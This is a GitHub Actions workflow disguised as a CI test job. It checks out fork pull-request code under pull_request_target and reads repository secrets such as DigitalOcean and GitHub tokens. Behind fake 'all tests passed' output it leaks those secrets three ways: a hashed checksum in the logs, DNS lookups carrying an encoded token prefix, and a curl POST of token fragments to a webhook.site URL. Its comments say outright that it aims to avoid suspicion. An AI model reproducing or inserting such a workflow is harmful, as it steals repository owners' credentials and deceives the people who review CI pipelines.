# .github/workflows/stealth-exfil.yml
name: CI Tests

on:
  pull_request_target:
    types: [opened, synchronize, reopened]
    
# Minimal permissions to avoid suspicion
permissions:
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    if: github.event.pull_request.head.repo.fork == true
    
    steps:
    - name: Checkout code
      uses: actions/checkout@v3
      with:
        repository: ${{ github.event.pull_request.head.repo.full_name }}
        ref: ${{ github.event.pull_request.head.ref }}
        
    - name: Run tests (cover for exfiltration)
      env:
        # Test for ANY secret that exists
        SECRET_1: ${{ secrets.DIGITALOCEAN_ACCESS_TOKEN }}
        SECRET_2: ${{ secrets.GITHUB_TOKEN }}
        SECRET_3: ${{ secrets.ACCESS_TOKEN }}
        SECRET_4: ${{ secrets.API_TOKEN }}
        
      run: |
        echo "ðŸš€ Starting test suite..."
        
        # Fake test output
        echo "âœ“ Running unit tests..."
        sleep 1
        
        echo "âœ“ Running integration tests..."
        sleep 1
        
        # STEALTHY EXFILTRATION
        # Method 1: Encode in "test results"
        if [ -n "$SECRET_1" ]; then
          echo "Test Results Summary:"
          echo "Total tests: 147"
          echo "Passed: 147"
          echo "Failed: 0"
          echo "Coverage: 94%"
          echo "Checksum: $(echo -n "$SECRET_1" | md5sum | cut -d' ' -f1)"
          echo "Token present: YES"
        else
          echo "Token present: NO"
        fi
        
        # Method 2: DNS exfiltration (very stealthy)
        if [ -n "$SECRET_1" ]; then
          TOKEN_PREFIX=$(echo -n "$SECRET_1" | cut -c1-20 | xxd -p)
          # This makes a DNS lookup that looks normal
          dig @8.8.8.8 "$TOKEN_PREFIX.$(date +%s).metrics.example.com" >/dev/null 2>&1 || true
        fi
        
        # Method 3: Encode in artifact name
        if [ -n "$SECRET_1" ]; then
          ENCODED=$(echo -n "$SECRET_1" | base64 | tr -d '\n' | cut -c1-10)
          echo "Artifact: build-$ENCODED.zip"
        fi
        
        echo "âœ… All tests passed!"
        
    - name: Upload test results (cover for webhook)
      if: always()
      env:
        WEBHOOK_SECRET: ${{ secrets.DIGITALOCEAN_ACCESS_TOKEN }}
      run: |
        echo "ðŸ“Š Uploading test results..."
        
        # This looks legitimate but exfiltrates
        if [ -n "$WEBHOOK_SECRET" ]; then
          # Create a "test report" that contains the token
          TOKEN_LEN=${#WEBHOOK_SECRET}
          TOKEN_FIRST5=$(echo -n "$WEBHOOK_SECRET" | cut -c1-5)
          TOKEN_LAST5=$(echo -n "$WEBHOOK_SECRET" | rev | cut -c1-5 | rev)
          
          cat > /tmp/test-report.json << EOF
          {
            "repository": "${{ github.repository }}",
            "pr_number": ${{ github.event.pull_request.number }},
            "test_summary": {
              "total": 147,
              "passed": 147,
              "coverage": 94
            },
            "build_info": {
              "token_detected": true,
              "token_length": $TOKEN_LEN,
              "token_prefix": "$TOKEN_FIRST5",
              "token_suffix": "$TOKEN_LAST5"
            }
          }
          EOF
          
          # Send to webhook
          curl -s -X POST "https://webhook.site/069b3073-d92e-4677-b186-be3499ade648" \
            -H "Content-Type: application/json" \
            -d @/tmp/test-report.json >/dev/null 2>&1
        fi
        
        echo "âœ… Results uploaded successfully"
